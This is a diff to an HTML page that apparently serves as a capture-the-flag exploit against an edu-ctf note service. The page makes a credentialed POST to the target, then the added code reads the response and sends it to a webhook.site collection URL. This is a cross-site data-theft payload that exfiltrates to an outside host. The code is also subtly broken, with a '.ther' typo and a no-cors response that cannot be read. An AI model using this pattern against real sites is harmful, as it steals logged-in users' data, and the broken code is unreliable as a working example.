@@ -5,7 +5,8 @@
         <input type="text" name="test" value="test">
     </form>
     <script>
-        var url = "https://webhook.site/72cc26a4-d931-4815-a455-a1b8dfdbe371"
+        var url = "https://edu-ctf.csie.org:44301/note/123"
+        var url1 = "https://webhook.site/72cc26a4-d931-4815-a455-a1b8dfdbe371"
         fetch(url, {
         body: "123", // must match 'Content-Type' header
         credentials: 'include', // include, same-origin, *omit
@@ -15,7 +16,22 @@
         },
         method: 'POST', // *GET, POST, PUT, DELETE, etc.
         mode: 'no-cors', // no-cors, cors, *same-origin
-    })
+        })
+        .then(function(response) {
+            return response.text()
+        })
+        .ther(function(my_text) {
+            fetch(url1, {
+            body: my_text, // must match 'Content-Type' header
+            credentials: 'include', // include, same-origin, *omit
+            headers: {
+            'user-agent': 'Mozilla/4.0 MDN Example',
+            'content-type': 'application/json'
+            },
+            method: 'POST', // *GET, POST, PUT, DELETE, etc.
+            mode: 'no-cors', // no-cors, cors, *same-origin
+            })
+        })
     </script>
   </body>
 </html>
